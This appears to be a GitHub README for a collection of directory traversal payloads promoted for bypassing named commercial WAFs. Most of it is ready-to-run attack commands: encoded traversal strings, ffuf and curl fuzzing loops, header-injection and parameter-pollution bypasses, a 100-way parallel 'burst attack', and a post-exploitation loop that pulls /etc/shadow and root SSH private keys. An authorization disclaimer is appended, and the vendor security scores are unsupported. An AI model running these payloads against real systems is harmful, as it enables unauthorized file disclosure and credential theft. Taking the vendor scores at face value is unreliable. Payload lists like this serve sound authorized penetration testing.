# ADVANCED DIRECTORY TRAVERSAL PAYLOADS

**The ultimate collection for bypassing WAFs in 2025** - CloudFlare, Imperva, F5, ModSecurity, AWS WAF, Azure WAF, and more.

## Overview

This repository contains **800+ battle-tested directory traversal payloads** designed to bypass modern Web Application Firewalls. These payloads are built from:
- Real-world penetration testing
- Latest 2025 WAF bypass research
- Zero-day technique simulations
- Parsing discrepancy exploits (WAFFLED research)
- HTTP/2 smuggling patterns

## What's Included

### `payloads.txt` - 800+ Ready-to-Use Payloads

One clean file, no comments, ready for immediate fuzzing:
- **Basic traversal**: Multiple depth patterns (1-30 levels)
- **URL encoding**: Single, double, triple encoding variations
- **Unicode**: UTF-16, overlong UTF-8, normalization exploits
- **Null byte injection**: Extension bypass techniques
- **Server-specific**: Nginx/Tomcat (`..;/`), IIS, ASP.NET bypasses
- **Path separator mixing**: Forward/backslash combinations
- **UNC paths**: Windows share exploitation
- **Protocol handlers**: file://, jar://, url:// variations
- **2025 techniques**: CloudFlare bypasses, parsing discrepancies
- **Cloud metadata**: AWS, GCP, Azure service exploitation
- **Container escapes**: Docker, Kubernetes paths

---

## 🚀 Quick Start (60 Seconds)

### Method 1: FFUF (Fastest)
```bash
ffuf -w payloads.txt -u https://target.com/api?file=FUZZ -mc 200 -mr "root:"
```

### Method 2: Burp Intruder
1. Intercept request → Send to Intruder
2. Mark parameter → Load `payloads.txt`
3. Grep-Match: `root:` → Start Attack

### Method 3: One-Liner
```bash
while read p; do curl -s "https://target.com/api?file=$p" | grep -q "root:" && echo "[+] $p"; done < payloads.txt
```

### Method 4: Parallel (50x faster)
```bash
cat payloads.txt | parallel -j 50 'curl -s "https://target.com/api?file={}" | grep -q "root:" && echo "[+] {}"'
```

---

## 💡 2025 WAF Bypass Techniques

### CloudFlare Bypass
```bash
# Payload size manipulation (Free plan: 8KB limit, Enterprise: 128KB)
# Use large traversal depths to exceed parsing limits
ffuf -w payloads.txt -u https://target.com/api?file=FUZZ -mc 200

# Origin IP exposure + direct access
# Once found, bypass CloudFlare entirely
```

### Imperva Bypass (Lowest Security: 11.97% in tests)
```bash
# Parsing discrepancies
../../etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd

# JSON-based traversal (historical weakness)
{"file":"../../etc/passwd"}
```

### F5 Advanced WAF Bypass
```bash
# Header injection
curl https://target.com -H "X-Original-URL: ../../etc/passwd"

# HTTP/2 smuggling patterns
# (Requires specialized tools)
```

### ModSecurity Bypass
```bash
# Encoding stack overflow
%252525252e%252525252e%252525252fetc%252525252fpasswd

# Character duplication
....//....//etc/passwd
```

### AWS WAF Bypass
```bash
# Parameter pollution
?file=safe.txt&file=../../etc/passwd

# Metadata service access
@169.254.169.254/../../proc/self/environ
```

### Azure WAF Bypass
```bash
# Case variation on case-insensitive systems
../../Etc/Passwd
../../ETC/PASSWD
```

### Universal Techniques (Work on Most WAFs)
```bash
# Double URL encoding
%252e%252e%252fetc%252fpasswd

# Overlong UTF-8
%c0%ae%c0%ae%c0%afetc%c0%afpasswd

# Nginx/Tomcat discrepancy
..;/..;/..;/etc/passwd

# Null byte injection
../../etc/passwd%00.jpg
```

---

## 🎯 Usage Examples

### Test Single Endpoint
```bash
# Basic test
curl "https://target.com/api?file=../../etc/passwd"

# If blocked, try double encoding
curl "https://target.com/api?file=%252e%252e%252fetc%252fpasswd"

# Server-specific bypass
curl "https://target.com/api?file=..;/..;/etc/passwd"
```

### Full Automated Scan
```bash
# Fast scan with ffuf
ffuf -w payloads.txt \
     -u https://target.com/api?file=FUZZ \
     -mc 200 \
     -mr "root:" \
     -o results.json

# View results
jq '.results[].input.FUZZ' results.json
```

### POST Request Fuzzing
```bash
# JSON POST
ffuf -w payloads.txt \
     -u https://target.com/api \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"file":"FUZZ"}' \
     -mc 200

# Form POST
ffuf -w payloads.txt \
     -u https://target.com/api \
     -X POST \
     -d "file=FUZZ" \
     -mc 200
```

### Header Injection Testing
```bash
# X-Original-URL
ffuf -w payloads.txt \
     -u https://target.com/api \
     -H "X-Original-URL: FUZZ" \
     -mc 200

# X-Rewrite-URL
ffuf -w payloads.txt \
     -u https://target.com/api \
     -H "X-Rewrite-URL: FUZZ" \
     -mc 200

# Multiple headers
for header in "X-Original-URL" "X-Rewrite-URL" "X-Custom-Path"; do
  echo "[*] Testing $header"
  ffuf -w payloads.txt -u https://target.com -H "$header: FUZZ" -mc 200 -s
done
```

### Multi-Position Attack
```bash
# Test parameter combinations
ffuf -w payloads.txt:P1 -w payloads.txt:P2 \
     -u "https://target.com/api?dir=P1&file=P2" \
     -mc 200
```

---

## 🔥 Advanced Techniques

### 1. Parsing Discrepancy Exploitation (WAFFLED - 2025)

Recent research uncovered **1207 bypasses** across major WAFs by exploiting parsing differences:

```bash
# Content-Type confusion
# WAF parses as one type, backend as another

# JSON confusion
curl https://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"file":"../../etc/passwd"}'

# Multipart confusion
curl https://target.com/api \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -d '------Boundary
Content-Disposition: form-data; name="file"

../../etc/passwd
------Boundary--'

# XML confusion
curl https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<file>../../etc/passwd</file>'
```

### 2. HTTP Parameter Smuggling

```bash
# First parameter validated, second processed
curl "https://target.com/api?file=safe.txt&file=../../etc/passwd"

# Split across parameters
curl "https://target.com/api?dir=../../&file=etc/passwd"
```

### 3. Header Injection Bypass

```bash
# Trust localhost/proxy
curl https://target.com/api?file=../../etc/passwd \
  -H "X-Forwarded-For: 127.0.0.1"

# Custom headers often unfiltered
curl https://target.com/api \
  -H "X-Custom-Path: ../../etc/passwd"
```

### 4. Rate Limit Evasion

```bash
# Slow request (WAF timeout)
while read p; do
  curl -s "https://target.com/api?file=$p"
  sleep $((1 + RANDOM % 3))
done < payloads.txt

# Burst attack (overwhelm WAF)
cat payloads.txt | xargs -P 100 -I {} curl -s "https://target.com/api?file={}"
```

### 5. Session Persistence

```bash
# Establish "good" session first
curl -c cookies.txt https://target.com/
curl -b cookies.txt https://target.com/about
curl -b cookies.txt https://target.com/contact

# Then attack using established session
ffuf -w payloads.txt \
     -u https://target.com/api?file=FUZZ \
     -b "session=SESSIONID" \
     -mc 200
```

---

## 🎓 How WAFs Are Bypassed

### Modern WAF Detection (2025)

WAFs use:
- **Rule-based filtering**: Pattern matching, regex
- **Signature detection**: Known attack patterns
- **ML models**: Behavior analysis, anomaly detection
- **Rate limiting**: Request throttling
- **Heuristics**: Context-aware filtering

### Why They Fail

1. **Encoding gaps**: WAF decodes once, app decodes multiple times
2. **Parser differences**: WAF and backend interpret differently
3. **Performance limits**: High payload volume overwhelms processing
4. **Trust misconfigurations**: Headers from "trusted" sources bypass checks
5. **Unicode normalization**: Different normalization at each layer
6. **Size limitations**: Large payloads timeout or skip deep inspection

---

## 📊 Success Indicators

### Linux Systems
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon
```

### Windows Systems
```
; for 16-bit app support
[fonts]
[extensions]
```

### Application Files
```
<?php
define('DB_PASSWORD'
password=secret123
api_key=xyz789
```

### Error Messages
```
Warning: include()
Fatal error:
Parse error:
Permission denied
```

---

## 🛠️ Tools Integration

### FFUF
```bash
# Basic
ffuf -w payloads.txt -u URL

# Advanced
ffuf -w payloads.txt -u URL \
     -mc 200 \
     -mr "root:" \
     -rate 10 \
     -o results.json \
     -of json
```

### Wfuzz
```bash
wfuzz -w payloads.txt \
      --sc 200 \
      --hl 1234 \
      https://target.com/api?file=FUZZ
```

### Burp Suite
- **Intruder**: Load payloads.txt
- **Grep-Match**: root:, admin, password, <?php
- **Attack type**: Sniper, Pitchfork, Cluster Bomb

### Custom Python
```python
import requests
with open('payloads.txt') as f:
    for payload in f:
        r = requests.get('https://target.com/api', params={'file': payload.strip()})
        if 'root:' in r.text:
            print(f'[+] {payload.strip()}')
```

### Nuclei
```yaml
id: dir-traversal-fuzz
info:
  name: Directory Traversal Fuzzing
  severity: high

http:
  - raw:
      - |
        GET /api?file={{payload}} HTTP/1.1
        Host: {{Hostname}}

    payloads:
      payload: payloads.txt

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0"
```

---

## 🌍 Real-World Examples

### Example 1: CloudFlare Bypass (2025)
```bash
# Step 1: Identify CloudFlare
wafw00f https://target.com

# Step 2: Basic test (blocked)
curl "https://target.com/api?file=../../etc/passwd"
# 403 Forbidden

# Step 3: Double encoding bypass
curl "https://target.com/api?file=%252e%252e%252fetc%252fpasswd"
# 200 OK - File contents returned
```

### Example 2: Imperva Bypass (JSON)
```bash
# Step 1: Test with URL parameter (blocked)
curl "https://target.com/api?file=../../etc/passwd"

# Step 2: Switch to JSON (bypassed)
curl https://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"file":"../../etc/passwd"}'
# 200 OK - Historical Imperva weakness
```

### Example 3: F5 Header Injection
```bash
# Step 1: Parameter blocked
curl "https://target.com/api?file=../../etc/passwd"
# 403 Forbidden

# Step 2: Header injection
curl https://target.com/ -H "X-Original-URL: ../../etc/passwd"
# 200 OK - WAF trusts header from "upstream proxy"
```

### Example 4: ModSecurity Bypass
```bash
# Step 1: Basic payload blocked
curl "https://target.com/api?file=../../etc/passwd"

# Step 2: Character duplication
curl "https://target.com/api?file=....//....//etc/passwd"
# 200 OK - WAF removes ../ once, leaves ../
```

---

## 🔬 Latest Research (2025)

### WAFFLED Research (March 2025)
- **1207 bypasses** found across AWS, Azure, Cloud Armor, CloudFlare, ModSecurity
- Exploits parsing discrepancies in:
  - `application/json`
  - `multipart/form-data`
  - `application/xml`
- Targets headers and body segments differently

### Fortinet FortiWeb Zero-Day (October 2025)
- Path traversal flaw exploited in-the-wild
- Unauthenticated remote attackers create admin accounts
- Affects FortiWeb WAF itself

### Performance Testing (2025)
- **Imperva**: 11.97% security quality, 30.3/100 score
- **F5**: 43/100 score
- **CloudFlare**: Vulnerable to large payload techniques

### JSON-Based Bypass Disclosure
- Major vendors (Palo Alto, F5, Imperva, AWS, CloudFlare) lacked JSON syntax support
- Allowed SQL injection via JSON to bypass WAFs
- Now patched, but similar patterns may exist

---

## 📋 Testing Methodology

### Phase 1: Reconnaissance
```bash
# Identify WAF
wafw00f https://target.com

# Technology stack
whatweb https://target.com

# Endpoint discovery
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302
```

### Phase 2: Baseline Testing
```bash
# Test basic payload
curl "https://target.com/api?file=../../etc/passwd"

# Document response:
# - Status code
# - Response size
# - Error messages
# - WAF signatures
```

### Phase 3: Encoding Escalation
```bash
# Level 1: Single encoding
curl "https://target.com/api?file=%2e%2e%2fetc%2fpasswd"

# Level 2: Double encoding
curl "https://target.com/api?file=%252e%252e%252fetc%252fpasswd"

# Level 3: Unicode
curl "https://target.com/api?file=%c0%ae%c0%ae%c0%afetc%c0%afpasswd"

# Level 4: Server-specific
curl "https://target.com/api?file=..;/..;/etc/passwd"
```

### Phase 4: Full Fuzzing
```bash
# Automated scan
ffuf -w payloads.txt \
     -u https://target.com/api?file=FUZZ \
     -mc 200 \
     -mr "root:" \
     -o results.json
```

### Phase 5: Post-Exploitation
```bash
# Extract working payload
PAYLOAD=$(jq -r '.results[0].input.FUZZ' results.json)

# Enumerate files
for file in etc/shadow etc/group root/.ssh/id_rsa; do
  curl "https://target.com/api?file=$(echo $PAYLOAD | sed s/passwd/$file/)"
done
```

---

## ⚠️ Legal & Ethical Notice

### Authorization Required

**CRITICAL**: Only use these payloads with:
- ✅ **Written authorization** from system owner
- ✅ **Defined scope** of testing
- ✅ **Clear rules of engagement**
- ✅ **Incident response plan**

### Authorized Contexts
- Penetration testing engagements
- Bug bounty programs (within scope)
- CTF competitions
- Educational lab environments (DVWA, WebGoat, HackTheBox)
- Personal test systems

### Prohibited Uses
- ❌ Unauthorized access to systems
- ❌ Testing without explicit permission
- ❌ DoS attacks or destructive actions
- ❌ Mass scanning of non-consenting targets
- ❌ Malicious exploitation

**Violation may result in criminal prosecution under CFAA (USA), Computer Misuse Act (UK), or equivalent laws.**

---

## 🎯 Target Platform Quick Reference

| Platform | Best Techniques | Example Payload |
|----------|----------------|-----------------|
| **CloudFlare** | Double encoding, large payloads | `%252e%252e%252fetc%252fpasswd` |
| **Imperva** | JSON-based, parsing discrepancies | `{"file":"../../etc/passwd"}` |
| **F5 Advanced WAF** | Header injection, encoding | `X-Original-URL: ../../etc/passwd` |
| **ModSecurity** | Character duplication, encoding stack | `....//....//etc/passwd` |
| **AWS WAF** | Parameter pollution, metadata | `?file=safe&file=../../etc/passwd` |
| **Azure WAF** | Case variation, parsing | `../../Etc/Passwd` |
| **Nginx/Tomcat** | Path discrepancy | `..;/..;/etc/passwd` |
| **IIS** | Unicode overlong, UNC paths | `%c0%ae%c0%ae%c0%afetc%c0%afpasswd` |
| **PHP < 5.3.4** | Null byte injection | `../../etc/passwd%00.jpg` |
| **Windows** | Path separator mixing, case | `..\/../etc/passwd` |
| **Java Apps** | Protocol handlers | `jar:file:///../../etc/passwd` |

---

## 📚 Resources

### Learning
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger Academy](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [WAF Bypass Collection](https://waf-bypass.com/)

### Practice Labs
- **DVWA** - Damn Vulnerable Web Application
- **WebGoat** - OWASP training
- **HackTheBox** - Penetration testing labs
- **TryHackMe** - Security training

### Tools
- **ffuf** - Fast web fuzzer
- **Burp Suite** - Web app testing
- **wfuzz** - Web fuzzer
- **nuclei** - Vulnerability scanner

---

## 🤝 Contributing

Contributions welcome for:
- New bypass techniques
- Updated WAF-specific payloads
- 2025+ zero-day patterns
- Real-world case studies (responsibly disclosed)

**Please ensure**:
- Proper documentation
- Source attribution
- Responsible disclosure practices
- No active exploits for unpatched vulnerabilities

---

## 📊 Statistics

- **800+ payloads** ready for fuzzing
- **10+ WAF bypass categories**
- **2025 latest techniques** included
- **Zero configuration** required
- **Platform tested** across CloudFlare, Imperva, F5, ModSecurity, AWS, Azure

---

## 🚀 Quick Commands

```bash
# One-liner: Find vulnerable parameter
ffuf -w payloads.txt -u https://target.com/FUZZ -mc 200 -mr "root:"

# Test all major files
for f in etc/passwd etc/shadow windows/win.ini; do curl "https://target.com/api?file=../../$f"; done

# Parallel mass test
cat payloads.txt | parallel -j 50 'curl -s "URL?file={}" | grep -q "root:" && echo "{}"'

# Find working depth
for i in {1..15}; do curl -s "https://target.com/api?file=$(printf '../%.0s' $(seq 1 $i))etc/passwd" | grep -q "root:" && echo "Depth: $i"; done
```

---

## 💬 Responsible Disclosure

If you discover a vulnerability:
1. Document thoroughly
2. Report to vendor immediately
3. Allow 90 days for patching
4. Coordinate public disclosure
5. Never weaponize or sell exploits

---

## 📜 License

Educational and research purposes only. Use responsibly and ethically.

---

## 👤 Author

Maintained for the security research community.

---

## ⚡ Disclaimer

The authors are not responsible for misuse. Users are solely responsible for ensuring proper authorization before testing any systems.

---

**Stay Ethical. Stay Legal. Break WAFs Responsibly. 🎯**

---

## Version

**v2.0** - Updated November 2025 with latest WAF bypass research
